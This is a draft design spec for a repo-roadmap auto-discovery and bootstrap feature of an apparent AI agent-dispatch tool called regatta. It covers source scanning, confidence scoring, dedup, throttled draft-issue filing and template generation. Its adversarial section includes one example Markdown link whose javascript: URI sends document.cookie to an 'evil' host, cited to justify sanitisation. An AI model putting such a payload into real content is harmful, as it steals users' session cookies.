---
status: draft
phase: self-host
summary: "Zero-touch bootstrap design for dispatching regatta against an arbitrary target repo with no pre-filed issues. Scans roadmap-source files (specs/, ROADMAP.md, TODO.md, GitHub milestones), files candidates as DRAFT issues gated by throttle + operator confirmation, then promotes to `[autonomous]`. Generates `regatta.yaml` + `CLAUDE.md` stubs from bundled templates when absent. Four implementer slices. Cross-repo selfimprove pattern sharing deferred to Phase-X."
date: 2026-06-08
---

# Cross-repo roadmap auto-discovery + zero-touch bootstrap

_Author: design session, 2026-06-08. Companion to #929 (multi-target-repo Option A) + #864 (smoke harness) + #955 (live-outcome validation). Memory rules in force: `feedback_default_simpler`, `feedback_decision_priority`, `feedback_root_cause`, `feedback_single_user_priority`, `feedback_no_signatures`, `feedback_deletion_default`, `feedback_validate_before_ship`._

```release-notes
[DOCS] Spec for cross-repo roadmap auto-discovery + zero-touch bootstrap.
Operator runs `regatta install-service --name <repo>` and the daemon
infers work-items from in-repo roadmap files (specs/, ROADMAP.md,
TODO.md, GH milestones), files DRAFT issues gated by throttle +
confirmation, then promotes to `[autonomous]`. Bundled `regatta.yaml`
+ `CLAUDE.md` stubs cover bootstrap. Four-slice implementer brief;
cross-repo selfimprove sharing deferred Phase-X. No prod code in this
PR.
```

## 1. Problem

#929 lands one-daemon-per-target so regatta can run against N repos. #864 documents the operator smoke that proves the loop closes on a freshly-installed daemon. Neither closes the operator-onboarding gap: on a fresh target repo, the operator must hand-author every `[autonomous]`-labelled issue before the loop has anything to dispatch against. The regatta repo only escapes this because the operator + the selfimprove detector seed issues during normal work; on `proj-b` the operator gets a working daemon and a quiet queue.

Three concrete pain points the operator hits on `regatta install-service --name proj-b`:

1. Daemon starts, scheduler ticks, `github_issues` adapter polls — zero issues match the `[autonomous]` selector — `WorkPlan` is empty forever.
2. Target repo has a `ROADMAP.md` with twelve unchecked checklist items and a `docs/specs/` directory with seven `status: pending` specs. None of them are issues. Operator must transcribe each into an issue by hand before regatta can do anything with them.
3. Target repo has no `regatta.yaml`, no `CLAUDE.md`. The daemon refuses to start (or starts in a degraded mode the operator can't diagnose) because `regatta serve --repo <path>` expects both files.

The wedge: regatta knows nothing about the target repo's roadmap intent. The roadmap exists — markdown files, GH milestones, project boards — but the dispatch loop only reads GH issues. Bridging the gap is the smallest viable unlock for true zero-touch onboarding.

Operator question: "I cloned regatta into a new project. Now what?" Answer today: hand-file twelve issues. Answer after this spec: `regatta roadmap-discover --repo <path>` → review draft issues → confirm → loop closes.

## 2. Goal

Add a roadmap-discovery pipeline that:

- Scans the target repo for known roadmap surfaces (specs/, ROADMAP.md, TODO.md, PLAN.md, GH milestones).
- Extracts candidate work-items via regex (no LLM in this spec).
- Dedupes against already-filed issues (title + content hash).
- Files candidates as DRAFT issues with the `regatta:discovered` label.
- Promotes drafts to `[autonomous]` after operator confirmation OR after a configurable auto-accept window.
- Generates `regatta.yaml` + `CLAUDE.md` stubs from bundled templates when absent.

Scope frame: single-operator, single-tenant, single-repo-per-daemon (per `feedback_single_user_priority` + `feedback_default_simpler`). Cross-repo learning shipped sideways (see §7).

## 3. Roadmap source detection

Five sources scanned in priority order; first match wins per candidate (dedup key = title + content hash). All five are off by default — the operator opts in per source via `regatta.yaml::roadmap.sources: []`.

### 3.1 Spec convention (regatta-native)

`docs/engineer/specs/*.md` — same layout this repo uses. Candidate = spec with YAML frontmatter `status: draft|active|pending`. Title = frontmatter `summary` first sentence; body = link to file + first 40 lines.

### 3.2 ROADMAP convention (community-common)

`ROADMAP.md`, `TODO.md`, `PLAN.md`, `docs/roadmap.md`, `docs/PLAN.md`, `docs/TODO.md` (case-insensitive on the filename, not the path). Candidate = unchecked checklist item (`- [ ] <text>`) OR heading ending in `` `TBD` ``/`` `TODO` ``/`` `PENDING` ``. Title = checklist text OR heading text (`TBD`/`TODO`/`PENDING` suffix stripped). Body = surrounding paragraph + file:line citation.

### 3.3 GitHub milestones

`gh api repos/<owner>/<name>/milestones?state=open` — each open milestone with no associated `[autonomous]` issue. Candidate title = milestone title; body = milestone description + `Milestone: <url>` footer.

### 3.4 GitHub Projects board (v2)

`gh api graphql` against `projectsV2` — items in `Status: Todo` columns with no linked PR. Candidate title = item title; body = item body + `Project: <url>` footer.

### 3.5 Override

`regatta.yaml::roadmap.sources` — operator-supplied glob list. Overrides §3.1–§3.4 selection but uses the same extraction rules. Example:

```yaml
roadmap:
  discovery:
    enabled: true
    sources:
      - docs/specs/*.md
      - work-items/**/*.md
      - github://milestones
      - github://projects/12
    auto_promote_after: 168h   # 7 days untouched ⇒ promote draft to [autonomous]
    daily_cap: 5
    confidence_min: 0.6
    redact:
      - internal-only
      - confidential
```

`enabled: true` is non-negotiable opt-in (see §6.4); a target repo with no `roadmap.discovery.enabled` block gets zero discovery activity.

## 4. Discovery pipeline

Five stages. Each stage is a pure function of the previous stage's output plus the GitHub API state at scan time.

### 4.1 Scan

Walk each enabled source. Read files locally (the daemon already has a checkout at `<workingDir>/repo` per #929 §6). Hit GitHub API only for milestones/projects. Skip files under `vendor/`, `node_modules/`, `archive/`, `.git/`. Skip files larger than 256KB (markdown roadmaps don't get that big; bigger ⇒ data file, skip).

### 4.2 Extract

Per source type, run the regex extractor from §3. Each match becomes a `Candidate`:

```go
type Candidate struct {
    Title       string   // first 80 chars, no newlines
    Body        string   // up to 2KB; longer truncated with ellipsis
    SourcePath  string   // relative path within repo OR github://milestone/<id>
    SourceLine  int      // 0 for GH sources
    Confidence  float64  // 0..1, see §4.3
    Hash        string   // sha256(title + body), used for dedup
    DiscoveredAt time.Time
}
```

### 4.3 Confidence score

Confidence is a heuristic, not a probability. Inputs:

- File-path priority: `docs/engineer/specs/` = +0.3, `ROADMAP.md`/`TODO.md` = +0.2, deeper paths = +0.1.
- Heading depth: `#`/`##` = +0.2, `###`+ = +0.1.
- Action verbs in title: "add", "implement", "fix", "design", "spec", "wire", "land" = +0.1 per hit (capped +0.2).
- Length: title 10–80 chars = +0.1, longer/shorter = 0.
- Already-cited issue number (`#NNN` in body) = -0.5 (likely already tracked).

`confidence_min: 0.6` filters candidates below threshold. Default 0.6 chosen so a clean `- [ ] Implement foo` in `ROADMAP.md` (path +0.2 + heading 0 + verb +0.1 + length +0.1 = 0.4) FALLS BELOW threshold without a deliberate spec entry — surface ROADMAP-only candidates only when operator lowers the threshold.

### 4.4 Dedupe

Two passes:

1. Hash match — query the `discovered_candidates` SQLite table (new, per-target DB at `<workingDir>/<name>.db`) for matching `Hash`. Skip if seen.
2. GH-side title-and-body fuzzy match — `gh issue list --search "<title-words>" -L 20 --json title,body,number,state`. Compute Levenshtein distance on title; if ≤5 OR body sha256 prefix-match length ≥16 chars, skip. Record the matched issue number in `discovered_candidates.matched_issue_id` so subsequent runs short-circuit.

### 4.5 File (throttled + draft-gated)

For each surviving candidate, in confidence-descending order, up to `daily_cap`:

1. Open issue with title prefix `[regatta:discovered] <title>`.
2. Body: candidate body + footer block:
   ```
   ---
   Discovered by regatta roadmap-discover on <UTC>.
   Source: <SourcePath>:<SourceLine>
   Confidence: <0.NN>
   Promote to autonomous: add label `[autonomous]` OR comment `/regatta promote`.
   Auto-promote: <auto_promote_after> from now unless this issue is edited/closed.
   ```
3. Labels: `regatta:discovered` only. NOT `[autonomous]`.
4. Record in `discovered_candidates` with `filed_issue_id`, `filed_at`, `state: draft`.

Throttle key = (`<owner>/<name>`, `UTC date`). When the daily cap is hit, remaining candidates are deferred to the next scan (not lost; queue persists in SQLite).

## 5. Zero-touch bootstrap (config + CLAUDE generation)

Three artifacts the daemon needs before it can dispatch:

### 5.1 `regatta.yaml`

If absent at `<repo>/regatta.yaml`, generate from bundled template `internal/bootstrap/templates/regatta.yaml.tmpl`. Defaults:

```yaml
version: 1
repo:
  host: github
  owner: <inferred-from-git-remote>
  name: <inferred-from-git-remote>
roadmap:
  discovery:
    enabled: false   # operator must opt in per §6.4
    sources: []
    daily_cap: 5
    confidence_min: 0.6
    auto_promote_after: 168h
adapters:
  github_issues:
    selector: '[autonomous]'
```

Banner comment at the top: `# REGATTA-generated baseline; edit to add repo-specific config. Generated <UTC> by roadmap-discover.`

### 5.2 `CLAUDE.md`

If absent at `<repo>/CLAUDE.md`, generate from bundled `internal/bootstrap/templates/CLAUDE.md.tmpl`. Stub content: project name + a "REGATTA-generated baseline; edit to add repo-specific rules. See <regatta-repo>/CLAUDE.md for the universal agent rules" banner. Empty body otherwise.

Rationale: target-repo-specific rules are operator's call. Regatta does NOT mirror its own CLAUDE.md verbatim into other repos — that would be invasive and would conflict with the target's existing conventions on the second-target case.

### 5.3 Dispatch templates

If absent at `<repo>/docs/engineer/dispatch-templates/`, fall back to bundled defaults at runtime. No file generation needed — the spawner resolves templates with `<repo>/docs/engineer/dispatch-templates/<role>.md → internal/orchestrator/spawner/builtin/<role>.md` chain. Per `feedback_default_simpler`, no template-copy step.

## 6. Quality gates (the four non-negotiables)

### 6.1 Throttle cap

`daily_cap: 5` default. Hard ceiling regardless of how many candidates regex out. Per-day-per-target, not global. Tunable per-target via `regatta.yaml`. Catches: malicious roadmap doc that introduces 200 checklist items overnight; regex over-match on a docs refactor.

### 6.2 Draft gate

Every discovered candidate filed as `[regatta:discovered]`, NEVER directly as `[autonomous]`. Operator must (a) add `[autonomous]` label manually OR (b) wait `auto_promote_after`. The daemon's adapter consumes `[autonomous]` only — the draft state is invisible to dispatch until promoted. Catches: false-positive extraction; stale roadmap entry; operator-internal note misread as work item.

### 6.3 Confidence threshold

`confidence_min: 0.6`. Sub-threshold candidates dropped before filing. Surfaced in `--dry-run` output for operator-tunable cutoff. Catches: low-signal extractions from doc paragraphs / off-roadmap files.

### 6.4 Opt-in per repo

`roadmap.discovery.enabled: true` REQUIRED. Default `false`. Without explicit opt-in, `regatta roadmap-discover` exits with `discovery disabled for <repo> — set roadmap.discovery.enabled: true in regatta.yaml to enable`. Catches: license/IP boundary — regatta auto-files issues into repos it doesn't own; opt-in is the boundary.

## 7. Cross-repo selfimprove sharing — Phase-X

Once N targets run discovery, selfimprove patterns observed in repo-foo (e.g. "implementer keeps missing release-notes fence") could inform repo-bar's prompt builder. Concretely:

- Selfimprove detector emits a `pattern_recurrence` event with a target-agnostic shape.
- A cross-target store (Postgres? a regatta-owned repo with a JSON file? out-of-process registry?) aggregates patterns.
- Per-target prompt builders consult the store and inject the top-K patterns.

Not in scope for this spec. Triggers Phase-X graduation when:

1. Operator runs discovery across ≥3 active targets for ≥30 days.
2. Same selfimprove pattern fires on ≥2 targets independently.
3. Operator manually duplicates the fix in both, hits the friction.

Reopen-trigger captured here so the graduation is auditable. Until then, each target's selfimprove store is per-DB at `<workingDir>/<name>.db` (already per-target by #929).

## 8. Adversarial pass — exploits per layer

Every layer of the pipeline has a plausible failure mode. The mitigations below are non-negotiable; removing any one re-opens the corresponding exploit.

### 8.1 Scan layer

**Exploit**: target repo contains a symlink loop or a 4GB markdown file. Scanner OOMs or hangs.

**Mitigate**: 256KB file size cap (§4.1); symlinks not followed (`filepath.WalkDir` with `os.Lstat`); 60-second total scan budget per `roadmap-discover` invocation; per-file 5-second extraction budget.

### 8.2 Extract layer

**Exploit**: malicious roadmap doc embeds Markdown link/image with `[click here](javascript:fetch('http://evil/'+document.cookie))`, GH renders it, operator clicks.

**Mitigate**: candidate body sanitized via `html.EscapeString` before filing; `javascript:`, `data:`, `vbscript:` URI schemes stripped to plain text. Body markdown re-rendered through the GH issue API (which already strips active content) — defense in depth.

**Exploit**: regex extractor matches inside a code fence (e.g. someone documents an `- [ ]` literal). Candidate is meaningless.

**Mitigate**: stateful scanner tracks ` ``` ` fence depth; matches inside a code fence are skipped. Same logic as `scripts/doc-check.sh` banned-phrase gate.

### 8.3 Confidence layer

**Exploit**: roadmap doc author games the heuristic — adds "implement" and "fix" verbs to every line to boost above threshold.

**Mitigate**: confidence is a filter, not a quality signal. Draft gate (§6.2) is the real backstop — gamed candidates still file as drafts, still need operator confirmation. Confidence threshold raises the floor; it does not replace human review.

### 8.4 Dedupe layer

**Exploit**: candidate body intentionally crafted to evade hash + Levenshtein dedup (zero-width spaces, homoglyphs, reordered words).

**Mitigate**: dedup is best-effort, not a security gate. Throttle cap (§6.1) limits blast radius even on full evasion — at 5 issues/day, the operator notices the spam within a day and disables discovery. Mitigate-by-throttle, not by perfect-dedup-regex.

### 8.5 File layer

**Exploit**: GH rate limit triggers mid-batch; partial issue creation leaves DB state diverged from GH state.

**Mitigate**: file-then-record ordering — write `discovered_candidates` row AFTER `gh issue create` returns 201; on partial failure, the next scan re-attempts only the unrecorded candidates. Idempotency key = candidate hash (already computed); duplicate filing returns the existing issue number via the GH dedupe in §4.4.

### 8.6 Promote layer

**Exploit**: auto-promote fires on a stale draft (operator forgot it exists, draft promotes after 7 days, regatta dispatches on outdated content).

**Mitigate**: revalidate before dispatch — when the adapter projects a `[autonomous]`-labelled issue that ALSO carries `regatta:discovered`, it re-fetches the cited source file and compares hash. Mismatch → adapter skips projection + logs `staleness mismatch`. Adapter never dispatches on outdated discovered content. (Pairs with #955 §L1 pre-dispatch validation.)

### 8.7 Privacy / redaction

**Exploit**: target repo's `ROADMAP.md` includes a paragraph mentioning a customer name, an internal-only project, an unannounced acquisition. Filing as a GH issue makes it world-visible (on public repos).

**Mitigate**: `roadmap.discovery.redact: [<term>, ...]` — candidates whose body OR title contains any redact term are dropped at the file step with a logged reason. Operator-curated list. Default empty list = no redaction. Common defaults documented in `docs/operator/configure.md`: `internal-only`, `confidential`, `do-not-share`, `nda`.

**Exploit**: target repo is public, discovery enabled, regatta files a draft issue with a candidate body that quotes a 100-line excerpt from a private doc that was accidentally checked in.

**Mitigate**: body length cap of 2KB (§4.2). Long bodies truncated with `... (source: <path>:<line>)` footer. Operator can still leak via short excerpts; redaction list is the user-controlled boundary.

### 8.8 Opt-in boundary

**Exploit**: operator clones regatta into a target repo and forgets to set `enabled: false`. (Currently impossible — default is false.) Inverse exploit: operator sets `enabled: true` once, forgets, regatta keeps discovering long after the operator moved on.

**Mitigate**: `regatta doctor` reports `roadmap.discovery.enabled: true` as a notable-but-not-error finding. Operator-facing visibility, not silent enablement.

## 9. Acceptance criteria

A.1 `regatta roadmap-discover --dry-run --repo <path>` prints discovered candidates + confidence scores + (would-be) issue numbers without filing anything. Exit 0 with zero candidates. Exit 0 with N candidates listed.

A.2 `regatta roadmap-discover --repo <path>` files candidates as `[regatta:discovered]` draft issues, respecting `daily_cap` + `confidence_min` + `enabled` flag. Exit 0 reports `filed N`, `skipped (cap) M`, `skipped (confidence) K`, `skipped (dedup) D`.

A.3 `regatta init --repo <path>` generates `regatta.yaml` from §5.1 template when absent. Pre-existing yaml left untouched (no overwrite without `--force`).

A.4 `regatta init --repo <path>` generates `CLAUDE.md` stub from §5.2 template when absent. Same overwrite policy.

A.5 Scheduled invocation: `internal/orchestrator/scheduler` invokes `roadmap-discover` once per `tick` interval when `roadmap.discovery.enabled: true`. Discovery latency is bounded by §8.1 scan budget; does not block adapter polling.

A.6 Failing tests landed first per `feedback_tdd_discipline`:

- `TestDiscoverRoadmap_FromSpecsDir` — given a target repo with `docs/engineer/specs/` containing 3 specs (1 `status: draft`, 1 `status: shipped`, 1 invalid YAML), discovery returns exactly the draft as a candidate.
- `TestDiscoverRoadmap_FromMilestones` — given a stubbed `ghclient` returning 2 open milestones (1 with a linked `[autonomous]` issue, 1 without), discovery returns the unlinked milestone as a candidate.
- `TestDiscoverRoadmap_Dedup` — given a candidate previously filed as issue #42, second discovery run dedups via the hash table + `matched_issue_id` short-circuit; no new issue filed.
- `TestDiscoverRoadmap_ThrottleCap` — given 10 candidates and `daily_cap: 5`, exactly 5 issues filed; remaining 5 deferred. Second invocation within the same UTC day files 0 more (cap exhausted).
- `TestDiscoverRoadmap_DraftGate` — every filed issue carries `regatta:discovered` label and NOT `[autonomous]`. Promotion: simulated `gh issue edit --add-label autonomous` flips the dispatch path from "drop, draft state" to "project, autonomous state". Auto-promote: a draft issue aged past `auto_promote_after` with no edits is promoted by the discovery loop on the next scan.

A.7 No prod code changes outside `cmd/regatta/`, `internal/orchestrator/discovery/` (new), `internal/bootstrap/` (new), `contracts/schemas/regatta.v1.cue` (new `roadmap` block). The existing `github_issues` adapter is unchanged.

## 10. Out of scope

10.1 Auto-prioritization — autotuner spec #926 covers cost-aware reorder; this spec does NOT rank candidates by anything other than confidence score for file order.

10.2 Cross-repo work-item routing — discovery is per-target; work_item X in repo-foo cannot depend on work_item Y in repo-bar. Phase-X if-ever.

10.3 Multi-tenant discovery — Phase-X W8; single-operator single-tenant per `CLAUDE.md` self-host filter. This spec assumes the operator owns or has write access to every target repo.

10.4 LLM-classified discovery — start regex-based. LLM classifier reopens when: (a) regex extractor misses ≥30% of candidates the operator hand-files anyway, OR (b) confidence scoring loses signal on real corpora. Defer until at least one of those triggers.

10.5 Roadmap watch (FS notify) — scheduled scan is enough. FS-notify reopens when scheduled scan latency >5 minutes harms operator UX.

10.6 Cross-repo selfimprove sharing — Phase-X per §7.

10.7 Discovery from non-markdown sources (Notion, Linear, Jira) — defer indefinitely. Per `feedback_self_host_filter`: external-customer ask triggers; until then markdown + GH is the operator's surface.

## 11. Migration / rollout

11.1 Land §13 slices 1–4 in four sequenced PRs (file-disjoint where possible; slice 1 + 2 can run in parallel since slice 1 only adds the CLI skeleton and slice 2 only adds source scanners).

11.2 Back-compat: zero impact on regatta-the-repo. `roadmap.discovery.enabled` defaults to `false`, so the regatta self-host loop continues to consume operator-filed `[autonomous]` issues exactly as today.

11.3 Operator workflow on first adoption against `proj-b`:

```
regatta install-service --name proj-b
cd ~/.local/share/regatta/proj-b/repo
regatta init                                  # generates regatta.yaml + CLAUDE.md stubs
# edit regatta.yaml: roadmap.discovery.enabled: true
# edit regatta.yaml: roadmap.discovery.sources: [docs/specs/*.md, ROADMAP.md]
regatta roadmap-discover --dry-run            # review what would be filed
regatta roadmap-discover                      # file drafts
# review drafts in GH UI, add [autonomous] label OR comment /regatta promote
# OR wait 7 days for auto-promote
```

11.4 Rollback: `roadmap.discovery.enabled: false` halts new filings. Filed drafts remain (operator-managed cleanup). No DB migration needed; `discovered_candidates` table is per-target and append-only.

## 12. Risk + adversarial pass (cross-cutting)

- **Risk**: discovery files a draft on an issue that's already been hand-filed by the operator under a different title. Dedup misses. **Mitigate**: §4.4 Levenshtein + body-hash dedup; operator-facing "already filed?" check is cheap (gh `--search`); on dedup miss, the throttle cap (§6.1) bounds noise.
- **Risk**: regatta dispatches against a freshly auto-promoted issue whose source content was deleted between filing and dispatch. **Mitigate**: §8.6 staleness mismatch — adapter re-validates source hash before projection; mismatch skips dispatch.
- **Risk**: opt-in flag set by an over-eager operator who doesn't realize discovery files PUBLIC issues on a PUBLIC repo. **Mitigate**: `regatta doctor` surfaces `enabled: true` + the source globs as an operator-visible finding (§8.8). Doc explicitly calls out the public-repo content-leak surface in `docs/operator/configure.md`.
- **Risk**: scheduler interval too aggressive; daemon hits GH search-API rate ceiling (30 req/min unauthed, 5000/hour authed). **Mitigate**: discovery scheduled at most once per `MinPoll` (default 30s shared with `github_issues` adapter per `internal/orchestrator/adapter/githubissues/adapter.go::DefaultMinPoll`). GH search calls in §4.4 dedup pass batched via `gh search issues "<terms>"` once per scan, not per candidate.
- **Risk**: target repo has no git remote (local-only project). Bootstrap can't infer owner/name for §5.1. **Mitigate**: `regatta init` prompts the operator OR accepts `--owner` `--name` flags; falls back to placeholder values that fail loudly when the adapter starts ("regatta.yaml::repo.owner is required").
- **Risk**: bundled templates drift from real regatta config schema. **Mitigate**: `internal/bootstrap/templates/regatta.yaml.tmpl` validated by `contracts/schemas/regatta.v1.cue` at test time (`TestBundledTemplates_PassCUEValidation`).
- **Risk** (scope creep): the obvious next ask is "scan all my repos for stale TODOs". **Mitigate**: §10.6 + §7 — cross-target discovery requires multi-tenant primitives; reopen only on Phase-X graduation triggers.

## 13. Implementer brief (4 slices)

Each slice is file-disjoint with the others where possible. Slice 1 + 2 parallelizable; slice 3 depends on 1 + 2; slice 4 depends on 3. Cap parallel implementers at 2 for this spec per `feedback_default_simpler`.

### Slice 1 — `regatta roadmap-discover` CLI skeleton (dry-run only)

Scope: `cmd/regatta/roadmap_discover.go` (new), `cmd/regatta/roadmap_discover_test.go` (new), wire into `cmd/regatta/main.go` subcommand dispatch.

Behavior: parses `--repo <path>`, `--dry-run`, `--json`. Outputs zero candidates (no scanners wired yet). Validates `roadmap.discovery.enabled` flag in `regatta.yaml`; exits with descriptive error when disabled.

Tests:
- `TestRoadmapDiscoverCLI_RequiresEnabled` — exit code 1 + stderr "discovery disabled" when flag false/absent.
- `TestRoadmapDiscoverCLI_DryRun_NoCandidates` — exit 0 + JSON `{candidates: []}` when enabled but no sources configured.
- `TestRoadmapDiscoverCLI_RepoFlagRequired` — exit 2 (CLI usage error) when `--repo` missing.

Owner: cmd/regatta surface. No shared-primitive collision with #929 (install_service) or #864 (smoke harness).

### Slice 2 — Source scanners (specs/, ROADMAP.md, milestones)

Scope: `internal/orchestrator/discovery/` (new package), `internal/orchestrator/discovery/scanner_specs.go`, `internal/orchestrator/discovery/scanner_roadmap.go`, `internal/orchestrator/discovery/scanner_milestones.go`, `internal/orchestrator/discovery/confidence.go`, plus matching `_test.go` files.

Behavior: each scanner exposes `Scan(ctx, repoRoot, client ghclient.Client) ([]Candidate, error)`. Confidence scoring per §4.3. No issue filing — pure extraction.

Tests:
- `TestDiscoverRoadmap_FromSpecsDir` per §A.6.
- `TestDiscoverRoadmap_FromRoadmapMd` — given `ROADMAP.md` with 3 unchecked + 1 checked checklist items, scanner returns 3 candidates.
- `TestDiscoverRoadmap_FromMilestones` per §A.6.
- `TestDiscoverRoadmap_CodeFenceSkip` — `- [ ]` inside a ` ``` ` fence is NOT a candidate.
- `TestDiscoverRoadmap_FileSizeCap` — 300KB markdown file skipped without scan.
- `TestDiscoverRoadmap_Confidence` — fixed inputs ⇒ expected scores per §4.3.

Owner: `internal/orchestrator/discovery/`. No collision with existing `internal/orchestrator/adapter/githubissues/`.

### Slice 3 — Dedupe + throttle + draft gate + file step

Scope: `internal/orchestrator/discovery/dedup.go`, `internal/orchestrator/discovery/throttle.go`, `internal/orchestrator/discovery/filer.go`, `internal/orchestrator/discovery/store_sqlite.go` (new `discovered_candidates` table + migration N+1, slot reserved by operator at dispatch time per `feedback_migration_number_lock`).

Behavior: full §4.4–§4.5 pipeline. Promotion semantics per §6.2. SQLite store at `<workingDir>/<name>.db` (table only, not new DB file).

Tests:
- `TestDiscoverRoadmap_Dedup` per §A.6.
- `TestDiscoverRoadmap_ThrottleCap` per §A.6.
- `TestDiscoverRoadmap_DraftGate` per §A.6.
- `TestDiscoverRoadmap_FileLayer_GHRateLimit` — stubbed 403 from `gh issue create` halts batch; on retry, only unfiled candidates re-attempt.
- `TestDiscoverRoadmap_Redact` — candidate body containing a redact term ⇒ dropped, logged, NOT filed.

Owner: `internal/orchestrator/discovery/`. Shared with slice 2 — slice 3 implementer MUST rebase on slice 2 before merging.

### Slice 4 — Scheduled invocation + bootstrap (`regatta init`)

Scope: `internal/orchestrator/scheduler/discovery_tick.go` (new), `cmd/regatta/init.go` (new) + `cmd/regatta/init_test.go`, `internal/bootstrap/templates/regatta.yaml.tmpl`, `internal/bootstrap/templates/CLAUDE.md.tmpl`, `internal/bootstrap/bootstrap.go` + `_test.go`.

Behavior: scheduler tick invokes `discovery.Run(ctx, target)` on the configured interval when `enabled: true`. `regatta init` writes the two templates when absent. Owner+name inferred from `git remote get-url origin` parse.

Tests:
- `TestRegattaInit_GeneratesYamlAndClaudeMd` — fresh dir + git remote ⇒ both files generated with correct values.
- `TestRegattaInit_NoOverwriteWithoutForce` — pre-existing yaml left intact; exit 1 with "use --force".
- `TestBundledTemplates_PassCUEValidation` — rendered yaml validates against `contracts/schemas/regatta.v1.cue`.
- `TestSchedulerTick_InvokesDiscoveryWhenEnabled` — stubbed scheduler ticks 3x with `enabled: true` ⇒ 3 discovery invocations; `enabled: false` ⇒ 0.

Owner: `internal/orchestrator/scheduler/` (shared composition root per `feedback_cascade_rebase_root_cause` — slice 4 implementer pre-files the shared primitive owner declaration in the PR body).

Pre-merge sequence: slice 1 + 2 in parallel → both merge → slice 3 → slice 4. Each PR rebased on `origin/main` immediately before automerge.

## 14. Followups (file as separate issues on spec land)

- F1: discovery from non-markdown sources (Notion, Linear, Jira) — Phase-X §10.7 trigger.
- F2: LLM-classified discovery — §10.4 trigger.
- F3: cross-repo selfimprove pattern sharing — §7 Phase-X.
- F4: `regatta doctor --discovery` companion — preflight that lists configured sources + last scan time + filed-draft count.
- F5: discovery on FS-notify rather than scheduled tick — §10.5 trigger.
- F6: per-source confidence weight overrides — operator-tunable §4.3 weights — defer until one operator complains about a real corpus.
